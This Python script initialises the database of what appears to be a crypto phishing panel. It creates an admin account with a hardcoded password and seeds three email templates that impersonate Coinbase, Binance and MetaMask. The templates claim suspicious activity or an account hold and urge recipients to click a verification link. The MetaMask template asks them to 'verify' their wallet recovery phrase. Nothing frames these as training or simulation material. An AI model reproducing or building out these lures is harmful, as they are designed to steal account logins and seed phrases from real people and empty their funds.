from pathlib import Path
import logging
from datetime import datetime
from src import create_app, db
from src.models import User, EmailTemplate

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

def init_db():
    """Initialize the database with tables and default admin user"""
    try:
        app = create_app()
        
        with app.app_context():
            logger.info("Dropping existing tables...")
            db.drop_all()
            
            logger.info("Creating new tables...")
            db.create_all()
            
            # Create admin user
            admin = User(
                username="admin",
                is_admin=True,
                registration_ip="127.0.0.1",
                last_login_ip="127.0.0.1",
                is_active=True
            )
            admin.set_password("Admin@123")
            
            # Add default email templates
            templates = [
                EmailTemplate(
                    name="Coinbase Hold",
                    subject="Important: Your Coinbase Account Has Been Placed On Hold",
                    html_content="""
                    <div style="font-family: Arial, sans-serif;">
                        <h2>Coinbase Security Notice</h2>
                        <p>Dear valued customer,</p>
                        <p>Your account has been temporarily placed on hold due to suspicious activity. Please verify your identity to restore access.</p>
                        <p>Click the button below to verify your account:</p>
                        <a href="{verification_link}" style="background-color: #0052FF; color: white; padding: 10px 20px; text-decoration: none; border-radius: 4px;">Verify Account</a>
                    </div>
                    """
                ),
                EmailTemplate(
                    name="Binance Verification",
                    subject="Action Required: Verify Your Binance Account",
                    html_content="""
                    <div style="font-family: Arial, sans-serif;">
                        <h2>Binance Security Update</h2>
                        <p>Dear user,</p>
                        <p>We've detected unusual activity in your account. Please complete the verification process to ensure your account security.</p>
                        <p>Click here to verify your account:</p>
                        <a href="{verification_link}" style="background-color: #F0B90B; color: white; padding: 10px 20px; text-decoration: none; border-radius: 4px;">Verify Now</a>
                    </div>
                    """
                ),
                EmailTemplate(
                    name="MetaMask Recovery",
                    subject="MetaMask: Secure Your Wallet Now",
                    html_content="""
                    <div style="font-family: Arial, sans-serif;">
                        <h2>MetaMask Security Alert</h2>
                        <p>Important Notice:</p>
                        <p>Your MetaMask wallet requires immediate attention. Please verify your recovery phrase to maintain access to your funds.</p>
                        <p>Click below to secure your wallet:</p>
                        <a href="{verification_link}" style="background-color: #E2761B; color: white; padding: 10px 20px; text-decoration: none; border-radius: 4px;">Secure Wallet</a>
                    </div>
                    """
                )
            ]
            
            # Add templates to database
            for template in templates:
                db.session.add(template)
            
            # Add and commit admin user and templates
            db.session.add(admin)
            db.session.commit()
            
            logger.info("Database initialized successfully!")
            logger.info("Default admin credentials:")
            logger.info("Username: admin")
            logger.info("Password: Admin@123")
            logger.info("IMPORTANT: Please change the admin password after first login!")
            
            return True
            
    except Exception as e:
        logger.error(f"Database initialization failed: {str(e)}")
        return False

if __name__ == "__main__":
    # Create database directory if it doesn't exist
    db_dir = Path('instance')
    db_dir.mkdir(parents=True, exist_ok=True)
    
    # Initialize database
    if init_db():
        print("\nDatabase setup completed successfully!")
        print("\nDefault admin credentials:")
        print("Username: admin")
        print("Password: Admin@123")
        print("\nIMPORTANT: Please change the admin password after first login!")
    else:
        print("\nDatabase setup failed. Check the logs for details.") 